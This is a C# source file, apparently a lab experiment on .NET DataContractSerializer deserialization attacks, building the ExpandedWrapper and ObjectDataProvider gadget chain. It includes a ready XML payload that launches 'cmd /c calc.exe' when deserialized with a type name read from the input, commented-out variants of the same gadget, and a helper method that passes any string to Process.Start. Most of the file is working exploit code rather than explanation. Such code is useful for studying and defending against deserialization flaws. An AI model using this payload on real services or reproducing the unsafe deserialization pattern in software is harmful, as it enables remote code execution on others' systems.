using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Serialization;
using System.Windows.Data;
using System.Data.Services.Internal;
using System.Diagnostics;
using System.IO;
using System.Xml;
using System.Configuration;

namespace DataContractSerializer_ObjectDataProvider
{
    [DataContract]
    [KnownType(typeof(TestClass))]
    [KnownType(typeof(ExpandedWrapper<TestSon, TestClass>))]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        private TestSon son;

        [DataMember]
        public string Classname { get => classname; set => classname = value; }

        [DataMember]
        public string Name { get => name; set => name = value; }

        [DataMember]
        public int Age { get => age; set => age = value; }

        [DataMember]
        public TestSon Son {get =>son; set=> son = value;}

        public override string ToString()
        {
            return base.ToString();
        }

        public static void ClassMethod(string value)
        {
            Process.Start(value);
        }
    }

    [DataContract]
    [KnownType(typeof(TestSon))]
    [KnownType(typeof(ExpandedWrapper<TestSon, TestClass>))]
    public class TestSon
    {
        private string classname;
        private string name;
        private int age;

        [DataMember]
        public string Classname { get => classname; set => classname = value; }

        [DataMember]
        public string Name { get => name; set => name = value; }

        [DataMember]
        public int Age { get => age; set => age = value; }

        public override string ToString()
        {
            return base.ToString();
        }
    }

    class Program
    {
        static void SerPayload()
        {

            /*
            ProcessStartInfo processinfo = new ProcessStartInfo();
            processinfo.FileName = "cmd.exe";
            processinfo.Arguments = " /c calc.exe";

            var process = new Process();
            process.StartInfo = processinfo;

            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "Start";
            odp.ObjectInstance = process;
            */


            /*
            ExpandedWrapper<Process, ObjectDataProvider> wrapper = new ExpandedWrapper<Process, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();

            ProcessStartInfo processinfo = new ProcessStartInfo();
            processinfo.FileName = "cmd.exe";
            processinfo.Arguments = "/c clac.exe";

            var process = new Process();
            //process.StartInfo = processinfo;

            wrapper.ProjectedProperty0.MethodName = "Start";
            wrapper.ProjectedProperty0.MethodParameters.Add("cmd.exe");
            wrapper.ProjectedProperty0.MethodParameters.Add("/c clac.exe");
            wrapper.ProjectedProperty0.ObjectInstance = process;

            */

            /*
            var wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();

            wrapper.ProjectedProperty0.ObjectInstance = new TestClass();
            wrapper.ProjectedProperty0.MethodName = "ClassMethod";
            wrapper.ProjectedProperty0.MethodParameters.Add("cmd.exe");
            wrapper.ProjectedProperty0.MethodParameters.Add("/c clac.exe");
            */

            var wrapper = new ExpandedWrapper<TestSon, TestClass>();
            wrapper.ProjectedProperty0 = new TestClass();
            wrapper.ProjectedProperty0.Name = "job";
            wrapper.ProjectedProperty0.Age = 18; 

            using (FileStream stream = new FileStream("./test.xml", FileMode.Create))
            {

                //DataContractSerializer jsonSer = new DataCtractSerializer(typeof(ExpandedWrapper<Process, ObjectDataProvider>));
                var jsonSer = new DataContractSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
                jsonSer.WriteObject(stream, wrapper);
            }
        }

        static void test()
        {
            using (FileStream stream = new FileStream("./test.xml", FileMode.Open))
            {

                //DataContractSerializer jsonSer = new DataCtractSerializer(typeof(ExpandedWrapper<Process, ObjectDataProvider>));
                //var jsonSer = new DataContractSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
                var jsonSer = new DataContractSerializer(typeof(ExpandedWrapper<TestSon, TestClass>));
                var obj = jsonSer.ReadObject(stream);
            }
        }

        static void DeserPayload()
        {
            string payload = 
@"<?xml version=""1.0""?>

<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">

    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal""                                                     xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""                                                      xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">

      <ExpandedElement z:Id=""ref1"" xmlns:a=""http://schemas.datacontract.org/2004/07/System.Diagnostics"">

        <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>

      </ExpandedElement>

      <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">

        <a:MethodName>Start</a:MethodName>

        <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">

          <b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">cmd</b:anyType>

          <b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">/c calc.exe</b:anyType>

        </a:MethodParameters>

        <a:ObjectInstance z:Ref=""ref1""/>

      </ProjectedProperty0>

    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>

</root>
";
            var xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(payload);
            var xmlitem = (XmlElement)xmlDoc.SelectSingleNode("root");
            DataContractSerializer jsonSer = new DataContractSerializer(Type.GetType(xmlitem.GetAttribute("type")));
            var obj = jsonSer.ReadObject(new XmlTextReader(new StringReader(xmlitem.InnerXml)));
        }
        static void Main(string[] args)
        {
            SerPayload();
            test();
            //DeserPayload();
        }
    }
}
